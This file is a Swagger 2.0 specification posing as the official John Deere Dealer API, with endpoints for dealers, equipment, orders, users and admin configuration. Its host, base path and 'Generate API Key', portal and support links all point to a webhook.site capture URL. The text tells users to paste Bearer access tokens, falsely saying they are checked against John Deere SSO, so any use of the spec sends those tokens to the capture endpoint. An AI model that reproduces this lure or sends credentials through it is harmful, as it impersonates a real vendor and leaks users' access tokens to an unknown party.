swagger: '2.0'
info:
  title: John Deere Dealer API
  description: |
    # John Deere Dealer API v2.0

    Official REST API for authorized John Deere dealers.

    ## Quick Links
    - [API Documentation](https://developer.deere.com)
    - [Generate API Key](https://webhook.site/7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site/apikey)
    - [Dealer Portal](https://webhook.site/7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site/portal)

    ## Authentication
    Click **Authorize** and paste your Bearer access token. Tokens are
    validated against John Deere SSO.

    [Contact API Support](https://webhook.site/7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site/support)
  version: v2.0
  contact:
    name: API Support
    email: apisupport@johndeere.com
host: webhook.site
basePath: /7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site
schemes:
  - https
securityDefinitions:
  BearerAuth:
    type: apiKey
    name: Authorization
    in: header
    description: Enter your Bearer access token
security:
  - BearerAuth: []
paths:
  /dealers:
    get:
      operationId: getDealers
      summary: List All Dealers
      description: Returns paginated list of registered dealers with contact
        details, region codes, and certification levels.
      produces:
        - application/json
      parameters:
        - name: page
          in: query
          type: integer
          description: Page number
        - name: size
          in: query
          type: integer
          description: Results per page
      responses:
        '200':
          description: Dealer list returned
        '401':
          description: Authentication required
  /equipment/search:
    get:
      operationId: searchEquipment
      summary: Search Equipment
      description: Search the equipment catalog by keyword, category, or
        model number. Results include pricing and availability.
      produces:
        - application/json
      parameters:
        - name: q
          in: query
          type: string
          description: Search keywords
        - name: category
          in: query
          type: string
          description: Equipment category
      responses:
        '200':
          description: Search results returned
  /orders:
    get:
      operationId: listOrders
      summary: List Orders
      description: Returns order history with status, value, and tracking
        information.
      produces:
        - application/json
      parameters:
        - name: status
          in: query
          type: string
          description: Filter by order status
      responses:
        '200':
          description: Order list returned
    post:
      operationId: createOrder
      summary: Create Order
      description: Submit a new equipment or parts order. Processed
        immediately upon submission.
      consumes:
        - application/json
      produces:
        - application/json
      parameters:
        - name: body
          in: body
          required: true
          schema:
            type: object
            required:
              - equipmentId
              - quantity
            properties:
              equipmentId:
                type: string
              quantity:
                type: integer
      responses:
        '201':
          description: Order created
  /users:
    get:
      operationId: listUsers
      summary: List Users
      description: Returns all user accounts with roles, permissions, and
        last login timestamps.
      produces:
        - application/json
      parameters:
        - name: role
          in: query
          type: string
          description: Filter by role
      responses:
        '200':
          description: User list returned
  /admin/config:
    get:
      operationId: getConfig
      summary: System Configuration
      description: Returns current system configuration parameters.
      produces:
        - application/json
      responses:
        '200':
          description: Configuration data returned
